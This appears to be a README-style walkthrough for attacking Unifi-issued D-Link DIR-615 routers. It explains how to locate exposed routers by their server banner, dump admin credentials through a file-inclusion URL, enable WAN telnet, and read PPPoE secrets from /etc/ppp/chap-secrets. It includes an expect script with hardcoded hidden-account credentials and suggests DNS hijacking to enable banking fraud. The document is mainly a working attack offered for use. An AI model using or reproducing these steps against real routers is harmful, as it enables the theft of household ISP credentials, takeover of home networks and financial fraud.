# UniFI-Dlink-DIR-615

Search for the Unifi Dlink DIR-615 router's Server details = Mathopd/1.5p6 country:MY
The country filter is only for registered user so make sure you have been registered

![Image 1](http://i.imgur.com/jtOlRoc.png "Image 1")

Choose any router you want

To get the user's creds, enter the following appendage = model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd

![Image 2](http://i.imgur.com/mNPyVWR.png "Image 2")

and poof !

![Image 3](http://i.imgur.com/1ohSIfy.png "Image 3")

As you can see, TM's operator add another hidden account under different name from the previous version
The good news is every D-Link router with copyright 2011 and above is using the same username and password as above while the D-Link router with the copyright 2010 and below is using username operator with different password.
So you guys need to enumerate the creds for every each routers or you can just include the chap-secrets file in the url instead of getting the httpassword first (/etc/ppp/chap-secrets).

# Leveraging the Attack

Actually the main reason for me to include /etc/ppp/httpassword is to let advanced attacker to make use of those credentials. For example, by changing the router's DNS server and set up a malicious DNS server with fake pages. This could lead to more dangerous risks such as online banking fraud, CSRF, and etc.

![Image 4](http://cdn.arstechnica.net/wp-content/uploads/2014/03/csrf-router-attack.jpg "Image 4")

# Getting PPPoE username and password

![Image 4](http://i.imgur.com/KngStCQ.png "Image 4")

Go to the Maintenance tab and enable the Remote Telnet from WAN, then save the settings
No reboot required

Open up a terminal and just telnet to the IP

```bash
telnet <ip> <port>
cat /etc/ppp/chap-secrets
```

And tadaa ! there you go the username and password

To automate the telnet part, use this simple script

```bash
#!/usr/bin/expect
set timeout 20
set ip [lindex $argv 0]
spawn telnet $ip 23
expect "login: "
send "Management\n"
expect "Password: "
send "TestingR2\n"
expect "# "
send "cat /etc/ppp/chap-secrets\n"
send "exit\n"
interact
```

Usage: ./unifi-pppoe-creds <ip>

Credits goes to: [link 1](http://seclists.org/bugtraq/2013/Dec/11) and [link 2](https://www.keithrozario.com/2013/12/unifi-d-link-routers-hacked.html)
